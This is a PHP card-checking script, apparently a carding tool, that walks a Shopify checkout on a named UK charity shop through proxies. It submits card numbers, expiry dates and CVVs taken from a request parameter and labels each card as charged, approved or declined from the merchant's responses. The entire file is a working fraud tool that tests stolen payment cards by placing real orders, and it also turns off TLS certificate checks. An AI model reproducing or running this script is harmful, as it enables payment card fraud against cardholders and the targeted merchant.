<?php
set_time_limit(0);
error_reporting(1);
$cookie = "cookie-".rand(1000,9999)."txt";

$second = 000000;
$lista = $GET["lista"];
$array = explode("|", $lista);
$cc = $array[0];
$mes = $array[1];
$ano = $array[2];
$mes1 = str_replace(0,"",$mes);
$ano1 = str_replace(20,"",$ano);
$cvv = $array[3];
$ano = '20'.$ano1;  

$proxy = ""; // put your proxy
$ex = explode(":", $proxy);
$host = $ex[0];
$port = $ex[1];
$user = $ex[2];
$pass = $ex[3];

if(!isset($proxy) or !$proxy) die("Sorry, but there is no proxy");

$sess = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));

$mid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));

$sid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));


function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false){
    return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor){
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

function getcapture($str, $starting_word, $ending_word){
$subtring_start  = strpos($str, $starting_word);
$subtring_start += strlen($starting_word);
$size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
return substr($str, $subtring_start, $size);
};


$F = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzgfghjfjfjf'), 0, 6);
$L = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzgfghjfjfjf'), 0, 10);
$C = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzgfghjfjfjf'), 0, 8);
$E = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzgfghjfjfjf'), 0, 8);

$ch = curl_init('https://www.poppyshop.org.uk/cart/32858897973302:1?traffic_source=buy_now');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: GET',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_PROXY, $host.":".$port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user.":".$pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$r1 = curl_exec($ch);
curl_close($ch);

$url = trim(strip_tags(getstr($r1, '"url":"', '?')));
$link = str_replace("\/","/",$url);
$TK = trim(strip_tags(getstr($r1, 'name="authenticity_token" value="', '"')));
//var_dump($r1);


////////////////[ 2 req ]/////////////


$ch = curl_init($link);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_PROXY, $host.":".$port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user.":".$pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TK.'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=karimgaming63%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Battributes%5D%5BGift+Aid%5D=No&checkout%5Battributes%5D%5Btitle%5D=Mr&checkout%5Battributes%5D%5Btitle%5D=&checkout%5Battributes%5D%5Btitle%5D=Mr&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=nellsone&checkout%5Bbilling_address%5D%5Blast_name%5D=Steve&checkout%5Bbilling_address%5D%5Baddress1%5D=3586+Daffodil+Lane&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=Arlington&checkout%5Bbilling_address%5D%5Bzip%5D=22201&checkout%5Bbilling_address%5D%5Bphone%5D=%2B1+703-434-6734&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=652&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-180');
$r2 = curl_exec($ch);
curl_close($ch);

$TK1 = trim(strip_tags(getstr($r2, 'name="authenticity_token" value="', '"')));

////////////////[ 3 req ]/////////////


/*
$ch = curl_init($link);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TK1.'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard-0.99&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=652&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-180&checkout%5Battributes%5D%5Busda_zone%5D=8a');
$r2 = curl_exec($ch);
curl_close($ch);
*/




$ch = curl_init('https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'method: POST',
'content-type: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
]);
curl_setopt($ch, CURLOPT_PROXY, $host.":".$port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user.":".$pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","name":"ahmed","month":'.$mes1.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.poppyshop.org.uk"}');
$r3 = curl_exec($ch);
curl_close($ch);
$id = json_decode($r3,1)["id"];



$ch = curl_init($link);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));

curl_setopt($ch, CURLOPT_PROXY, $host.":".$port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user.":".$pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TK1.'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D=39237255222&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=500&checkout_submitted_request_url=https%3A%2F%2Fwww.poppyshop.org.uk%2F25635913782%2Fcheckouts%2Fd72fd38599530a3cc1cae1b1b388eac2%3Fprevious_step%3Dcontact_information%26step%3Dpayment_method&checkout_submitted_page_id=11defaf4-4263-41F5-883C-CE3C9DA7F93E&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=652&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-180');
$r5 = curl_exec($ch);
curl_close($ch);

usleep(5 + $second);

$ch = curl_init($link."?from_processing_page=1&validate=true");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_PROXY, $host.":".$port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user.":".$pass);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$r6 = curl_exec($ch);
curl_close($ch);


$msg = trim(strip_tags(getstr($r6, 'class="notice__content"><p class="notice__text">', '</p></div></div>')));

if((strpos($r5, 'Your order is confirmed'))  || strpos($r5, 'placed') || strpos($r5, 'Order canceled')  || strpos($r5, 'You can find your order number in the receipt you received via email.') ||strpos($r5, 'Thank you for your purchase!') || strpos($r5, 'Thanks for supporting') || (strpos($r5, '<div class="webform-confirmation">'))) {
echo "
<b>#CHARGED : $lista  ✅
<br>RESPONSE: Order placed !!.
 ";
} else if((strpos($r5, 'Your order is confirmed'))  || strpos($r5, 'placed') || strpos($r5, 'Order canceled')  || strpos($r5, 'You can find your order number in the receipt you received via email.') ||strpos($r5, 'Thank you for your purchase!') || strpos($r5, 'Thanks for supporting') || (strpos($r5, '<div class="webform-confirmation">'))) {
echo "
<b>#CHARGED : $lista  ✅
<br>RESPONSE: Order placed !!.
 ";
} elseif(strpos($r6, 'Billing address info was not matched by the processor')) { 
echo "
<b>#Approvedd AVS : $lista  ✅
<br>RESPONSE: Order Billing address info was not matched by the processor !!.
 ";
} elseif(strpos($r6, 'Insufficient Funds')) {
echo "
<b>#Approvedd CVV : $lista  ✅
<br>RESPONSE: 2001 Insufficient Funds
 ";
} elseif(strpos($r6, '2010 Card Issuer Declined CVV')) {
 echo "
<b>#Approvedd CCN : $lista  ✅
<br>RESPONSE: 2010 Card Issuer Declined CVV
 ";
}elseif(strpos($r6, 'Security code was not matched by the processor')){
echo "
<b>#Approvedd CCN : $lista  ✅
<br>RESPONSE: Security code was not matched by the processor
 ";
} else {
echo "
<b>#declined : $lista  ❌
<br>RESPONSE: $msg
 ";
}

unlink($cookie);
